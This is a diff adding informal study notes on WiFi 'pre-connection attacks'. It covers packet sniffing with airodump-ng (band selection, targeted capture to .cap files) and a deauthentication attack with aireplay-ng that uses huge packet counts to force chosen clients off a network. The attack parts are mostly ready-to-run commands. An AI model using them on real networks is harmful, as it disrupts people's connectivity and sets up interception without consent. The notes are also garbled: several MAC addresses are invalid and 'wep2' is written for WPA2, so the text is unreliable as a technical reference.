@@ -1,0 +1,69 @@
+Packet Sniffing -PRECONECTION ATTACKS
+USE 	Airodump-ng
+part of aircrack-ng suit
+use to capture packect
+display informat relasted to network
+connectyed clients
+use  command "airodump-ng"
+in monitor mode
+
+ESSID IT SHOW NAMES OF WIRELESS NETWORK
+
+BSSID SHOW MAC ADDRESS
+ 
+PWR SHOW SIGNAL STRENGTH HIGHER NUM MORE STRONG
+
+beacon sends frames tell it exists even if hidden
+MB maximum speed supported by network
+enc is encryption used for e.g wep wep2
+
+ WiFi Bands - 2.4Ghz & 5Ghz Frequencies
+previously we could only see 2.4 band using airodumpo-ng
+sniffing 5 giga hertz
+
+
+airodump-ng --band a wlan0 a show 5 giga hertz
+airodump-ng --band abg wlan0 show 2.4/5giga hertz same time
+problem slow using abg need powerfull adapter slightly slower better to sniff independent
+
+Targeted Packet Sniffing
+
+airodump-ng --bssid C8:5A:9F:F1:57:B7 --channel 11 --write test wlan0 
+telling airmon to sniff targeted network telling bssid and channel --write test wlan0 data in file
+show one network
+bellow u can see all devices connected
+
+then run command ls u can see airodump store data in file 
+esktop    Pictures    test-01.kismet.netxml
+Documents  Public     test-01.cap                       test-01.log.csv
+Downloads  Templates  test-01.csv
+Music      Videos     test-01.kismet.csv
+
+main file we will use is test-01cap store info everthing these device did on internet
+problem data is encrypted wep2 use less data bcz encrypted 
+us full thing we can see device manufacturer
+we can kind a guiess but not enough info
+ 
+
+Deauthentication Attack 
+
+disconnect any device from the internet without even connecting to it works on wep wpa wep2
+no need to know network key
+method 
+pretend to be the client by changing mac to the client tell router i want to disconnect from you the pretend to router changing mac to router tell client u req to disconnect i am disconnecting you 
+use:
+aireplay-ng --deauth [deauth packets 100000 large num] -aq [network mac]-c [target mac] [interface]
+aireplay-ng --deauth 100000000 -a O8:5A:4F:F1:E7:G7 -c 9C:28:F7:61:BF:BC wlan0
+if 5g network 
+aireplay-ng --deauth 100000000 -a M8:5P:9F:F1:07:B7 -c 9C:28:F7:61:BF:BC -D wlan0
+
+if u attack using this client would  disconnect from network but join mobile data or other wiff 
+solution open another terminal run command again change network bssid[new network id ]
+larege num bcz it keep sending lare amount of packects to router and device
+-a specify router mac adrres - c specify client
+airodump-ng --bssid C7:DA:VF:L1:57:B7 --channel 11 wlan0
+run this in seprate terminator
+aireplay-ng --deauth 1000000 -a C7:DA:vF:l1:57:B7 -c cC:28:Fy7:6o1:0F:rC wlan0
+
+small attack use to plug in other attacks
+
